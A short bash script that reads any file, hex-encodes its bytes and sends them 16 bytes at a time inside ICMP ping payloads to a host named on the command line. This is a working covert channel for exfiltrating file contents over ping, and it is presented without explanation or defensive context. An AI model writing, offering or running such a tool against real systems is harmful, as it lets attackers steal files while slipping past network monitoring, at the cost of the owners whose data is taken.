#!/bin/bash

HEXA=$(od --endian=big -t x1 -An < $1)

count=0

for byte in $HEXA
do
    count=$((count+1))
    hexstring=${hexstring}${byte}
    
    # Need 16 byte alignment
    if [ $(($count % 16)) -eq 0 ]; then
        ping $2 -c 1 -p $hexstring
        hexstring=""
    fi
    #echo $count $byte
done

# Align the last few bytes if necessary
padding=$((16 - count % 16))
while [ $padding -ne 0 ]; do
    hexstring=${hexstring}00
    padding=$((padding - 1))
done

ping $2 -c 1 -p  $hexstring
